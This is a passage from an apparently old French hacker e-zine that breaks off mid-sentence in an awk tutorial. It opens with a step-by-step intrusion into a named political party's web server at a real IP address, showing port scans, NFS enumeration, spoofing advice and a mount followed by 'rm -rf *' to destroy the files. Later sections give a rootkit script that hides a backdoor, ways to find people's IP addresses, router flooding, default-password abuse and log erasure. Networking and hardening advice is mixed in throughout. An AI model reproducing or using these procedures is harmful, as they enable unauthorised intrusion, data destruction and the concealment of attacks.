+C'est dur de hacker ? vous trouvez, moi pas (enfin ca depend des fois quand 
+meme!). Je trouve bien plus dur de securiser, et encore, je vais la aussi vous
+expliquer comment securiser tout ca! (ah, je suis trop bon).
+Comme on ne peut pas hacker les americains sans s'attirer des gros ennuis, je
+vais m'amuser avec notre site raciste national.
+j'ai nomme www.front-nat.fr (209.130.76.129):
+
+Port    State       Protocol  Service
+7       open        tcp        echo            
+21      open        tcp        ftp             
+22      open        tcp        ssh             
+23      filtered    tcp        telnet          
+25      open        tcp        smtp            
+80      open        tcp        www             
+110     open        tcp        pop3            
+111     open        tcp        sunRPC         
+135     filtered    tcp        unknown         
+137     filtered    tcp        netbios-ns      
+139     filtered    tcp        netbios-ssn     
+389     open        tcp        unknown         
+443     open        tcp        https           
+513     open        tcp        login           
+514     filtered    tcp        shell           
+554     open        tcp        unknown         
+605     filtered    tcp        unknown         
+635     filtered    tcp        unknown         
+703     filtered    tcp        unknown         
+825     open        tcp        unknown         
+896     filtered    tcp        unknown         
+908     filtered    tcp        unknown         
+923     filtered    tcp        unknown         
+1024    filtered    tcp        unknown       
+
+oulah, il y en a des ports ouvert, je comprends mieux pourquoi ils ne sont fait
+hackes la derniere fois!!!
+Notez bien que je vais passer par ce trou geant qu'est le port 111, j'ai un ami
+qui etait passe par des failles de leur ssh, faites comme bon vous semble.
+Des que vous voyez le port 111 open (et non filtred), vous pouvez 
+automatiquement faire un rpcinfo -p 209.130.76.129.
+ce qui donne :
+
+   program no_version protocole  no_port
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100024    1   udp    823  status
+    100024    1   tcp    825  status
+    100021    1   udp   2049  nlockmgr
+    100021    3   udp   2049  nlockmgr
+    100021    4   udp   2049  nlockmgr
+    100021    1   tcp   2049  nlockmgr
+    100021    3   tcp   2049  nlockmgr
+    100021    4   tcp   2049  nlockmgr
+    100005    1   tcp   1024  mountd
+    100005    1   udp   1026  mountd
+    391004    1   tcp   1025
+    391004    1   udp   1027
+    390113    1   tcp   7937
+
+explication : rpcinfo vous donne les informations liees au portmapper, les 
+services qu'il utilise sont identifes par un numero qui est toujours le
+meme.
+
+ouah!! trop dur : mountd et nfsd en meme temps... mais c'est trop facile!
+Je suis curieux de savoir ce que ce site a mis dans /etc/hosts.allow...
+showmount 209.130.76.129
+
+Hosts on www.front-nat.fr:
+/tsmail.rapidsite.net
+mail05.rapidsite.net
+nexus.hway.net
+ts01.hway.net
+
+ouais!!!! il y a de quoi faire :)
+
+je veux savoir quels sont leurs repertoires montes :
+showmount -d 209.130.76.129
+Directories on www.front-nat.fr:
+/tsmail.rapidsite.net:/u
+/u
+/u/web
+
+et puis tant qu'on y est : qui a quoi ?
+showmount -a 209.130.76.129
+All mount points on www.front-nat.fr:
+/tsmail.rapidsite.net:/u
+mail05.rapidsite.net:/tsmail.rapidsite.net:/u
+mail05.rapidsite.net:/u
+nexus.hway.net:/u
+ts01.hway.net:/u/web
+
+ouais!!! bingo
+je vous laisse finir : faites un petit DNS spoof (plein d'articles ont etes
+ecrit dessus) en prenant le nom de l'un des serveurs ayant acces au repertoire
+/u,
+faites ensuite un petit coup de arp sur le server choisi, trouvez un programme
+qui vous change d'adresse MAC et adaptez la votre a celle du server, c'est 
+mieux (mais bon, ca serait stupide de faire un authentification sur l'adresse
+MAC, quoi que, venant du FN).
+et monter le repertoire distant dans un repertoire local :
+
+mount 209.130.76.129:/u /hackfn
+cd /hackfn
+rm -rf *
+
+j'oubliais, trouvez quelque chose qui vous permet d'etre root sur une station
+BSD si vous voulez supprimer les logs :)
+
+TOP chrono : hack fait en 5 minutes.
+
+Pour securiser, je vous conseil d'utiliser SAMBA qui est en Open Source, ce qui
+est bien meilleur si un bug est decouvert, alors d'ici la, supprimez le 
+demon portmap.
+pour les newbies qui ont redhad ou mandrake, allez dans /etc/rc.d/init.d/ et
+supprimmer portmap et les services associes (NIS, NFS..)
+pour les autres, ce repertoire varie, /etc/rc.1 (runlevel 1)... /etc/init.d...
+a vous de voir.
+
+    ------------------------------------
+    ----- Comment dupper M. ROOT ? -----
+    ----------------------------------7-
+
+  Bien sur, il y a root et root, celui qui fait bien son boulot et celui
+qui ne sait pas le faire. Un expert en securite pourra deceler assez 
+rapidement cette technique de tromperie.
+Nous allons d'abord voir en quoi consiste cette technique, et apres,
+comment bien l'utiliser et enfin, pour M. ROOT, comment securiser.
+C'est aussi connu sous le nom de rootkit.
+
+
+1. En quoi cela consiste t-il ?
+    C'est une technique qui vous permet de rester en tant que root le plus
+longtemps possible en y laissant un programme qui reagira en fonction de
+votre volontee. Par exemple, modifiez la commande ls pour quelle affiche
+tous les fichiers, sauf votre programme. Ou encore, la commande ps pour
+que le processus de votre programme ne soit pas affiche, la commande who
+pour que votre nom n'aparaisse pas.
+
+
+2. Comment on fait ?
+    Il faut bien sur connaitre Unix ou GNU/Linux sur le bout des doigts.
+Vous pouvez le faire simplement a l'aide d'un script shell qui verifie
+l'existence de tel fichier (votre backdoor).
+renommez par exemple le fichier ls en lsd :), ensuite, utilisez un
+script shell qui :
+	- verifie l'existence de votre backdoor
+	- le deplace dans un autre repertoire	
+	- montre les fichiers
+	- redeplace le backdoor dans le bon repertoire
+
+c'est tres facile a faire et a comprendre, meme un lamer pourrait y
+arriver, c'est vous dire!
+voici le script shell commente :
+
+#!/bin/bash
+if test -a backdoor #verifier l'existence de votre backdoor
+   then mv backdoor /tmp #deplace backdoor dans tmp
+                         # tmp est le seul repertoire que tout les
+                         # utilisateurs peuvent utiliser
+                         # sauf cas exceptionnel :(     
+   else ls $1 # explique apres
+fi  
+ls $1 # $1 reprend le premier parametre (ex. : ls, ls -l, ls -la..)
+mv /tmp/backdoor /bin # deplace le backdoor dans le repertoire /bin
+                      # si vous voulez que votre backdoor soit
+                      # deplace a plusieurs endroits, utilisez le 
+                      # repertoire courant ( . ).
+                       
+Vous pouvez aussi creer un programme en C qui modifie l'action de ls,
+c'est beaucoup mieux car c'est plus discret, vous pouvez trouver a peu
+pres partout les sources de GNU/Linux avec entre autres la commande
+ls et la reprogrammer pour en faire selon vos desir.
+/* cependant beaucoup d'admins regardent les octets de leur ls original
+   et le compare avec le recent suspecte */
+
+3. Comment securiser ?
+il faut etablir un script qui verifie la taille de vos fichiers  pour etablir 
+ce script, utilisez la commande 'ls -l' ahhh mais 
+elle a ete modifiee, c'est pas grave car le cracker la laisse 
+fonctionnelle meme si elle est en rootkit.
+En gros, vous devrez excuter le virus pour savoir si vous avez un
+virus.
+Mais non, il y a mieux! et cela grace a awk (ah merci!), cet outil,
+tres peu connu des debutants permet de faire des merveilles.
+des que l'installation de votre systeme est faite (avant d'etre 
+connecte), tapez les commandes ci-dessous : 
+attention, vous n'etes pas un simple utilisateur mais le root (sinon
+a quoi ca vous servirait de lire cette section pour securiser votre
+systeme ?)...
+ls -l /bin > /root/files.ls
+ls -l /usr/bin >> /root/files.ls
+ls -l /sbin >> /root/files.ls
+ls -l /usr/sbin >> /root/files.ls
+bien sur, vous pouvez etendre le nombre de repertoires suivant 
+l'utilisation que vous en faites.
+vous trouverez un listing de ce type (extrait) :
+
+total 81164
+-rwxr-xr-x	1	root	root	28920	Dec 08 1993	 cp
+-rwxr-xr-x	1	root	root	52244	Dec	08 1993  ls	
+
+avec awk, nous allons pouvoir faire une recherche sur cp ou ls
+puis recuperer les octets et les comparer avec ceux du nouveau ls
+je ne vous donne pas la solution car :
+- le manuel gawk est disponible dans /usr/doc/gawk*
+- awk est explique dans une autre rubrique
+- on apprend mieux quand on cherche tout seul (c'est vrai)
+
+exemple : 
+# cat files.ls | awk '/cp/ {variable=$5}'
+# ls -l | awk '/cp/ {variable2=$5}'
+et apres a vous de trouver comment on compare :) 
+
+
+    ------------------------------------
+    ----- L'IP dans tous ses etats -----
+    ----------------------------------8-
+
+"Ah non en vla un qui va nous faire encore un cours sur ceux que l'on sait
+!!!"
+Et ben moi je dis non.
+"C'est pas parce que tu connais comment qu'on fait pour avoir l'ip dans
+l'IRC que tu sais tout" 
+Alors c'est partit
+
+a) choper l'ip d'une personne.
+
+- on commence dans le plus facile IRC, oui tous le monde le sais si tu tape
+/dns pseudo de ta cible et que tu vas sur statut 
+tu as sont ip et ben pas toujours parcque l'on peu cacher son ip sur IRC.
+Mais ne declare pas forfait tu remarque a la place (dans statuts) une adresse
+qui est celle du serveur de ta cible
+sa veux dire tous simplement que tu l'as L'ip t'as juste a aller sous dos et
+taper :
+Ping -a "l'adresse ip du serveur" (incroyable)
+
+- on continue avec ICQ, ah! icq que tous le monde utilise bon une méthode
+que tous le monde connait c'est,quand tu 
+regarde les infos de t'as cible tu peu voir son ip. Oui mais il est souvent
+planqué alors la je rie ,regarde sur un 
+de tes contacte hors ligne y'a last ip affiche .Hein ben, habituellement il le
+cache(...)ca veut donc dire que,
+et oui tu fais disconnected et la tu peux voir l'ip de qui tu veux dans ses
+infos cool non.
+"ah! oui mais je savais tous sa "
+"ah!! ben alors t'es 1/4 de hacker" :-))
+
+- on continue toujours mais va falloir reflechir maintenant .
+Quand tu envoie un packet sur le net a un autre ordi, tu est plus ou moin
+connecte avec, sous dos une commande 
+du nom de netstat tres utile te permet de voir l'etat des ports (c'est quoi
+sa?? ah!! pour un hacker t'en sais des 
+choses toi !?!)
+bon on continue avec un exemple pour mieux comprendre.
+Mr Dupont se fait hacker et il a des soupcons deux solution s'offre a lui:
+soit il a lock down et le hacker c'est fais stoper et il a son ip.
+soit il tape netstat sous dos et la il a l'ip du hacker et les ports actife de
+sont pc.
+"Mais alors sa veut dire que..."
+Ben oui, on commence a etre moin con car je le repete si netstat regarde
+les ports actifs de ton pc en bref se qui rentre
+et sort hum!! interessant.
+ben un fire wall et netstat ah!! enfin un declique le fire wall controle ce qui
+rentre et sortde Mr Pc pour l'instant 
+pour mieux comprendre on va supposer qu'il utilise une commande
+netstat.(on verra plus tard comment ca marche)
+Alors sa veut tout simplement dire que si tu envoies un packet (des donnees
+sur le net)
+tu peu suivre son chemin puisque si c'est un message que tu envois directe
+a un autre pc netstat pourra te donner l'ip du pc.
+On va pour l'instant s'arréter là et attendre vaut remarque bref pour
+connaitre les fonction possible de netstat taper sous 
+dos netstats ? 
+BOn on passe a l'autre moitier de cet initiation a l'ip.
+
+b)Les sites internet.
+
+Internet est basé sur un protocole TCP/IP l'ip c'est quoi au juste, ben
+l'adress d'une machine qui est souvent aléatoire.
+C'est aussi l'adresse des sites qui elle est stable mais alors c'est quoi la
+différance entre www.mon site.com et 
+123.xx.32.xx ben juste que c'est plus simple de retenir "mon site " que sont
+ip.
+[Nd 3d13 : Selon la norme IPv4 car IPv6 est statique, cf RFC correspondantes]
+si tu tape dans ton navigateur 123.xx.32.xx tu te retrouves sur
+www.monsite.com
+(pourquoi j'explique sa ben faut bien pour la suite )
+Donc on va un peu utiliser le dos, tous le monde que la commande tracert
+sert a tracer (ouah!) ben ouich
+quand tu fais tracert www.mon site.com tu aura son ip et en prime les
+rooters.(c'est quoi un rooter ben c'est 
+les liaison de chez toi au site par ou passe l'info)
+wah! trés explicite ben ze fais exprés parcque sa nous intéresse pas pour le
+moment.Pour connetre l'ip du site
+tu peu aussi taper Ping www.mon site .com t'aura et l'ip et la vitesse de
+connection.
+En fait c'est deux commande serve a connetre la vitesse de connection
+(ping) et le chemin emprunte (tracert).
+
+Remarque:
+
+Ping www.nom du site.com
+Ping 123.xx.32.xx
+
+C'est la meme chose.
+Pour connaitre plus d'info tapez sous dos:
+Ping ? et Tracert ?
+
+Bon mon petit cours s'arrete ici, je vous laisse essayer tous ce que j'ai dis
+et trouver les utilisation possible
+de ping,tracert,telnet et peu etre vous m'enverais un cours dessus sa
+m'eviterais de le faire pour aller directe au but.
+N'hesitez pas a faire des remarques et évitez d'utilisé les trojs ou autre
+saloperie .
+
+
+    -------------------------------------
+    ----- Internet et la vie privee -----
+    -----------------------------------9-
+
+De nos jours, il est impossible de surfer sur Internet sans qu'il y ait
+quelques chose de commmercial, on peut payer avec sa carte bancaire n'importe
+ou, pour n'importe quoi, ce n'est pas encore banalise, mais demain on achetera
+beaucoup plus sur Internet, ce reseau devient de plus en plus important et la
+securite devient de plus en plus une preocupation alors comment va devenir ce
+reseau ???
+Quant on voit ceux qui s'amusent a Hacker des serveurs pour prendre le listings
+de toutes les cartes bancaires ou encore ceux qui s'amusent à les planter, je
+crois que l'etat va vite trouver un truc pour eradiquer tous les geneurs
+ainsi il va tout faire pour reduire de plus en plus la liberte sur internet et
+si ca continue comme ca on aura tous une clef unique pour nous identifier sur
+Internet, tous les messages seront cryptes et les hackers deviendront
+cryptographes, seulement personne ne veut de ca, mais ça arrive !!!
+
+Il suffit de regarder ce qu'il se passe maintenant(pas seulement au niveau
+d'internet):
+
+  - Le projet echelon
+
+On commence a en entendre parler un peu partout, dans certaines zines
+(hackoff21..) pour ceux qui auraient du retard, c'est un réseau inimaginable mis
+en place par la NSA il y a un peu pres 20 ans, ce reseau interceptait d'abord
+les messages des entreprises americaines puis celle de chaque habitant,
+maintenant ce reseau ecoute tout le monde. Toutes les communications sont
+interceptees et traitees pas des ordinateurs qui doivent bien avoir une certaine
+intelligence pour pouvoir analyser nos communications, si le messages
+comportes des mots sensibles ou des expressions comme "bombe" "drogue" une
+analyse approfondie cette fois par un humain est realisé afin de pouvoir
+deceler toutes failles permettant de renforcer "notre" securite nationale. Ce
+qu'il y a de meilleur avec ce reseau c'est qu'il est capable de reconnaitre
+votre voix donc je vous laisse imaginer que la cabine du coin c'est pas non
+plus anonyme et le meilleur pour la fin ce reseaux existe aussi en France et
+le document : Cwi.txt attache au zine le prouve
+
+
+  - Les sattelites
+
+Ils permettent de voir ce qui se passe sur terre depuis l'espace,
+officiellement ild sont capables de compter le nombre de bouttons sur votre
+chemise mais il en existe des biens plus perfectionnes qui peuvent voir a
+travers une armature en beton.
+Il y'a quand meme des limites, les sattelittes ne voyent pas a travers les
+nuages (theoriquement), ca coute cher et si vous ne levez pas la tete il y a
+aucun moyen de vous identifier (a moins que vous ayez un tracer cache sur
+vous). Si vous ne me croyez pas, certainnes entreprises permettent de prendre 
+une photo de votre maison par un satellite !
+
+Avec ce que l'on peut voir plus haut je pense que vous aurez compris que nous
+sommes de plus en plus diriges, controles voir manipules (mais ça c'est un 
+autre combat) quand l'etat en aura assez il prendront des mesures que l'on a
+vraiment pas envie d'imaginer, il faut prendre conscience que plus rien n'est
+anonyme et qu'il faut faire attention ! 
+La scene underground francaise se develloppe malgre les coups que donnent les
+censeurs alors essayez un maximum de vous proteger, de subsistez !!!
+
+    ------------------------
+    ----- Les routeurs -----
+    ---------------------10-
+
+  Quelques articles ont deja ete ecrit dans la scene mais ils ont soit etes
+trop compliques pour certains, soit trop simple pour d'autre, je vais donc
+ici faire plaisir a tout le monde ;)
+Tout d'abord, vous savez que l'information transmise sur un reseau passe par
+des couches. Vous savez pas ? bon, je vous explique, les autres, vous pouvez
+sauter.
+ {conseil : lisez un bouquin sur le tcp/ip, meme un simple}
+Au tout debut de l'internet, la communication a ete definie selon une norme,
+la norme qui regit les reseaux est le modele OSI.
+La norme OSI est definie selon 7 couches qui sont :
+    
+ 1  Application          
+         |
+ 2  Presentation  
+         |
+ 3    Session
+         |
+ 4   Transport
+         |
+ 5    Network (reseau)
+         |
+ 6   Data Link (liaison de donnees)
+         | 
+ 7    Physical (physique) 
+
+TCP s'appuye de ces couches pour fonctionner (meme si il n'en utilise que 5).
+Exemple, vous envoyez un e-mail, voici comment ca fonctionne... (sous tcp)
+
+    Application (sous tcp : 1,2 & 3) : sendmail, outlook, messenger...
+    Transport (sous tcp : 4)         : envoyer les donnees au routeur
+    Internet (sous tcp : 5)          : routeur
+    Interface reseau (sous tcp : 6)  : distribution des donnees
+    Physique (sous tcp : 7)          : reception client
+    
+//fin de la partie extra-debutante
+
+Les routeurs opperent, selon la norme OSI, au niveau de la couche reseau.
+Quand un cracker detruit intentionnellement un routeur cela a des repercussions
+extrement graves sur tout le reseau.
+Pour simplfier, le routeur effectue un petit calcul pour retrouver le nombre
+de sous-réseaux d'une machine, par exemple, un client nous envoie
+son adresse, qui est par exemple de classe C, il effectue un AND (Il suffit
+d'avoir un 0 en entree pour avoir un zero en sortie).
+exemple : 
+      adresse  : 192.168.5.138    11000000.10101000.00000101.10001010
+      masque   : 255.255.255.0    11111111.11111111.11111111.00000000
+      resultat : 192.168.5.0      11000000.10101000.00000101.00000000
+
+Afin de transiter les messages, les routeurs utilisent 2 protocoles de
+routage qui sont :
+RIP : Routing Information Protocol, ce protocole provoque un traffic important
+      sur l'ensemble du reseau et est limite aux reseaux ne comportant pas
+      plus de 15 routeurs.
+OSPF : Open Shortest Path First, base sur le choix du meilleur chemin pour
+       atteindre une destination, il permet de definir le parametre cout et est
+       adapte aux grand reseaux.
+
+Mais le routeur ne fait pas que transporter des paquets d'un point a un autre,
+il essaye aussi de retourner les codes d'erreur ICMP.
+ICMP (Internet Control Message Protocol) permet d'assurer le suivi du paquet,
+il possede un tas de types d'options, les plus connus sont TTL (utilise par
+traceroute),  ICMP possede aussi un type qui lui permet de ralentir de debit
+des paquets si ils sont passes trop rapidement par exemple... mais le but de
+cet article n'est pas de parler d'ICMP (car on pourrait en raconter), cependant
+si votre curiosite n'est pas satisfaite, allez chercher des rfc dessus, allez
+dans http://www.rfceditor.org et cherchez icmp, vous aurez de quoi lire :)
+Dans tous les cas, le routeur se sert d'ICMP pour decrementer la TTL de 1, pour
+eviter que les paquets transitent indefiniement sur le reseau.
+
+Il existe des routeurs logiciels et des routeurs materiels, la majorite des
+routeurs materiels sont des cisco (venant d'une societe etudiante cree a San
+Francisco), ils sont assez simple a configurer. 
+Les principaux routeurs logiciels sont generalements des routeurs d'arrivee.
+Il n'est pas rare de voir des entreprises utiliser Novell Netware comme 
+routeur, surtout que depuis la version 5, il supporte TCP/IP en natif.
+
+Tout ca c'est cool mais comment les hacker!!!?
+ahah, il n'y a pas une methode, pensez bien.
+Pour les routeurs software, vous pouvez utiliser un bug logiciel ou les bloquer
+a l'aide d'un petit flooding pour avoir acces a d'autres machines d'une firme
+(si vous vous plantez, vous plantez toutes les machines :>>).
+les routeurs materiels possedent aussi des bugs, vous n'avez qu'a voir ce qu'il
+y a dans la base de donnee du cert (cert.org).
+N'oubliez pas que les routeurs vous permettent de faire du sniffing un fois
+hackes! etant donne qu'il faut un point d'access, c'est comme en telephonie
+fixe :>> eheh petits phreakers!
+
+N'oubliez jamais que certains routeurs sont la uniquement pour relever les IP
+qui passent par la. D'autres uniquement pour transiter les paquets et encore
+d'autres qui font les deux :)
+Aussi, les mots passes generiques des routeurs cisco sont souvent laisses tel
+quels dans le sentreprises, j'ai deja vu des igniominies a ce sujet, allez
+voir un peu ce que vous dira cert.org la dessus.
+
+    -----------------------------
+    ----- Intrusion - tutor -----
+    --------------------------11-
+
+Cet article a pour but d'expliquer ce qu'est-ce qu'une intrusion sous forme
+d'un tutoriel.
+Nous allons tout d'abord vous expliquer quelques rappels sur le protocole 
+TCP/IP et passer en revues quelques attaques.
+
+Forme d'un paquet IP
+
+        ________________________________________________________________
+  	|   |   |             |                 |   |                  |
+  	| 6 |...| 192.168.5.4 | 192.168.236.120 |...| TCP, UDP ou ICMP |
+  	|___|___|_____________|_________________|___|__________________| 
+          ^             ^               ^                    ^    
+    Protocole      @source     @destination             message
+  
+ Protocole :
+    TCP  = 6
+    UDP  = 17
+    ICMP = 1
+    
+Envoi des donnees sur une autre machine (routeurs : TTL = Time To Live)
+
+ [ ]---*----*--------*-----------*-------------*-----------[ ]
+TTL=80 79  78       77           76            75          
+
+Fragmentation/Reassemblage de fragments
+
+                                             .       .
+ Fragment 1         |...|src|dest|...|1010010.       .
+ donnees fragment 3                          .       .011011|
+ donnees fragment 2                          .0111101.
+ paquet IP          |...|src|dest|...|1010010|0111101|011011|
+  
+Message ICMP
+      
+       ________________________________
+      |      |      |                  |
+      | Type | Code | ................ |
+      |______|______|__________________|  
+
+Type :
+  
+  01 = echo reply
+  03 = destination unreachable
+  04 = source quench
+  05 = Redirect (change of route)
+  08 = echo request
+  11 = time exceeded
+  12 = parameter problem
+  13 = timestamp request
+  14 timestamp reply
+  ...
+  
+Note : si vous desirez programmer sur icmp, utilisez la librairie 
+       /usr/include/netinet/icmp6.h
+         
+      
+Flags TCP
+
+  SYN = pour etablir une connection
+  ACK = pour aquitter un paquet
+  RST = pour detruire une session
+  FIN = pour mettre fin a une session
+  PSH = pour interdire le stockage temporaire
+  URG = pour indiquer une Passons maintenant a la pratique...
+
+tout d'abord, il va falloir rechercher des informations sur le site,
+tout ce que vous pouvez trouver (outils rpcinfo, dnsquery et autres...)
+mais aussi sur les moteurs de recherches classique ou encore mieux avec
+les metacrawlers (ex. : www.google.com).
+Les recherches d'informations DNS se font avec dig (cf. gtmhh)
+
+Ensuite, une fois les informations trouvees, il va falloir les exploiter
+en recherchant le svulnerabilitees sur le systeme d'exploitation, les serveurs,
+les differentes versions des programmes.
+outils : traceroute, ping, hping, firewalk, filterrules, netcat, nmap, queso,
+         strobe, udp-scan, telnet, netcat...
+        
+
+Exploitation des vulnerabilites.
+
+Installation d'un backdoor pour y faire venir tous vos amis.
+
+Installation d'un sniffer, pour avoir d'autres mots de passe.
+
+Suppression de vos traces, n'oubliez pas /var/log et les autres.
+A ce propos, je tiens a signaler qu'une fois j'ai failli me faire pieger a 
+cause d'un admin vicieux qui avait des logs dans /var/log certes, mais qui 
+etaient aussi copies dans un autre repertoire, genre /home/jveur, j'ai pu
+m'en rendre compte en faisant une meta-recherche avec l'outil find.
+Heureusement que j'ai fait ca par hasard et que je connais bien unix parce
+qu'autrement j'aurais ete piege (enfin mes proxys :), mais on aurait pu me
+retracer avec du temps et de l'argent.
+Alors, toujours envie de rester sous win ? ok, vous pourrez peut-etre faire
+un petit telnet et avoir acces a un shell, mais vous n'aurez pas toute la
+pratique des commandes hehe :)
+
+
+    ---------------------
+    ----- firewalls -----
+    ------------------12-
+Il existe un nombre varie de firewalls, ils sont souvent assimilles a des outil
+de detection d'intrusion, ce qui est loin d'etre faux.
+Il y a cependant des firewalls specialises dans un certain champ, ou bien ceux
+qui couvrent a peu pres tout, vous pouvez en mettre plusieurs a la suite.
+Tous les firewalls vous indiquent qui fait quoi sur votre systeme.
+le firewall par definition est un mur qui est cense empecher l'intrusion,
+il est programme pas un ou plusieurs experts en securite et non par des
+programmeurs en C, car cela demande une tres grande connaissance en matiere
+d'intrusion informatique.
+Cependant, si vous etes interesse par programmer un tel outil, commencez par
+apprendre la programmation d'une socket avec l'article de Rocket dans ce
+numero!!!
+Il y a plusieurs types d'attaques dont vous devez vous premunir, mais cela
+depend de la taille de votre architecture intra-logicielle de votre reseau
+[ca veut rien dire, je vous rassure, mais je suis un peu naze, allez, je me
+reprends!!!]
+La phrase qui illustre mes propos au mieux est la tres celebre, peut etre meme
+trop celebre, "Security through obscurity", la securite par l'obscurite, qui
+veut dire que moins votre site est connu du grand public, plus il sera 
+protege contre une eventuelle attaque exterieure, mais faites attention aux
+employes vengeurs car ils n'ont pas eu l'augmentation demande, qu'ils font
+350 heures au lieu de 35 heures (euh.. ils bossent dans une start'up?).
+Mais si l'on veut classifier les types d'attaques, il y a :
+  - DoS, denial of service, attaque floodant votre server pour le paralyser
+  - intrusion, attaque accedant aux ressources de votre machine
+  - social engeenering, "allo... j'ai perdu mon password"
+et aussi, on peut recherche qui vous attaque ?
+il y a plein de facons de vous attaquer, au meme titre qu'il y a plein
+de pirates qui agissent de facon differente, certains font ca pour le
+delire, ils font aucun mal, d'autres, sont de vrais vandales, les crashers!
+d'autres encore, font ca pour augmenter leur score de site pirates et ne
+regardent meme pas ce que vous avez sur votre machine!
+ou aussi, vous pouvez etre confronte a l'espionnage industriel.
+
+Comment proteger votre site ?
+mine de rien, un bon admin qui fait bien son boulot recherche les bugs,
+est inscrit a des listes de diffusion, mais surtout : il patche!
+plus la version de votre systeme ou d'un logiciel est recente, moins vous
+aurez de problemes, deja, vous balayez les scripts kiddies, les newbies et
+autres formes de cracker ayant un niveau faible ou moyen : vous ne gardez
+que les meilleurs qui sont aprfois appelles elites, le moyen le plus
+efficace de les supprimmer ? F.I.R.E.W.A.L.L., bon, je sais que l'on peu les
+contourner mais... c'est deja plus dur, enfin ca depend car parfois, cela
+peut faire un hole de plus!
+mais plus schematiquement, voici a quoi ressemble un firewall sur un
+reseau informatique :
+
+  [ ]----[ ]----[ ]----[ ]----[ ]	machines du reseau
+       
+              FIREWALL       
+ 
+       I  N  T  E  R  N  E  T
+
+quels sont les services a proteger en premier ?
+e-mail : premier service utilise sur l'internet
+acces a un terminal a distance (r*, telnet, ssh)
+transfert de fichier (FTP)
+informations personnelles des personnes
+NFS, Network File system (cf. articles dans ce numero)
+LPD, demon d'impression a distance
+
+aussi, plus votre defense est diversifiee, plus est elle bonne, ce qui
+rend les choses plus securisees.
+L'ordinateur le plus vulnerable a une attaque est appelle "Bastion host",
+il faut y faire tres attention car c'est lui qui se trouve dans le firewall!
+
+La forme la plus classique d'un firewall est compose comme suit :
+un routeur exterieur
+un bastion host
+un routeur interieur
+sachant quele routeur exterieur communique avec internet et que le
+routeur interieur communique avec le reseau interne.
+mais bon, vous devez vous demander a quoi peut vraiment bien servir un
+bastion host a part se faire attaquer ?
+le bastion host s'occupe de redistribuer au reseau interne les e-mails recus,
+c'est sur lui que vous vous connectez quand vous etes en ftp anonyme, c'est
+encore lui qui se charge de repondre a vos questions sur son nom de domaine,
+filtre les paquets et joue le rote le server proxy, eh oui, c'est lui qui fait
+tout ca, pas mal!
+Cependant, afin de redistribuer les taches et de securiser encore mieux votre
+reseau, vous pouvez utiliser le multiple bastion host, un qui s'occupe 
+de ftp, un autre de SMTP, un autre de www, un autre de DNS...
+Vous pouvez aussi placer un bastion host en tant que routeur exterieur mais
+certainnement pas en tant que routeur interieur, cela s'appelerait un hole.
+Faites attention a ce que vous faites avec votre reseau, il est par ailleurs
+dangeureux d'utiliser plusieurs routeurs interieurs : cela engendre un tas
+de problemes.
+Un cas plus interessant est celui de l'utilisation de routeurs exterieurs
+multiples : cela permet a votre reseau d'acceder a internet a l'aider du
+routeur specialise pour cette tache et d'aller sur un reseau different comme
+le X.25 pour ne citer que lui a l'aide d'un autre routeur.
+Vous pouvez mettre un bastion host pour les deux ou, separer le reseau en 
+mettant un bastion host par routeur.
+Aussi, il peut y avoir plusieurs endroits ou le firewall peut se placer :
+entre internet les les machines comme dit au debut, mais aussi entre les
+machines elles-memes, imaginez que vous offrez un compte public aux 
+utilisateurs, c'est la derniere solution qui serait la bienvenue.
+
+Pour choisir un firewall, il a des criteres tres rudes a remplire.
+Je vous conseille fortement d'utiliser Plan 9 de Bell Labs pour vos bastions
+hosts ou alors du supprimmer le root sur vos machines Unix ou GNU/Linux.
+Un autre critere est la localisation de votre machine, mais je n'ai 
+malheureusement plus ces criteres en tete, et puis vous pouvez les chercher
+sur un metacrawler tres facilement : +"bastion host" +"physical location"
+Ensuite, la mesure a prendre est de ne pas avoir d'accomptes utilisateurs
+sur votre bastion host! evidemment.
+Il y a aussi des services a supprimer, mais pour vous aider dans votre
+tache, vous pouvez utiliser un outil tel que nessus qui vous fournis un
+rapport d'analyse complet ainsi que d'eventuels conseils pour securiser.
+
+Pour conclure, les firewalls sont une science pointue que je ne peux pas
+expliquer en un article : vous pouvez maintenant vous renseigner sur les
+attaques informatiques, la configuration de routeurs, de bastion hosts...
+vous ne connaitrez pas tout du reseau, meme a 80 ans en ayant fait ca tout
+sa vie sans avoir eu le temps de fonder une famille... ahhhhhhhhhhh!
+
+
+    ---------------
+    ----- awk -----
+    ------------13-
+    
+awk est une langage script, c'est a dire qu'il ne se compile pas, il 
+s'interprete (un peu comme perl). Il permet principalement de gerer des
+bases de donnees, mais il possede des tonnes d'autres fonctions.
+si vous souhaitez en apprendre plus a la suite de cet article sur awk, vous
+pouvez aller lire le document /usr/doc/gawk*/gawk.ps.
+Nous allons commencer soft : comment ecrire un phrase simple en awk :
+a votre prompt shell, tapez :
+   $ awk 'BEGIN {print "Hello, world!"}'
+jusque la, assez facile a comprendre : awk appelle l'interpreteur du meme
+nom (notez que certains systemes linux ne connaissent pas cette commande,
+dans ce cas, tapez gawk a la place).
+maintenant, comment faire apparaitres des " ? hein ?
+simple : commen en C, on met des antislash devant \
+exemple :
+   $ awk 'BEGIN {print "disons : 
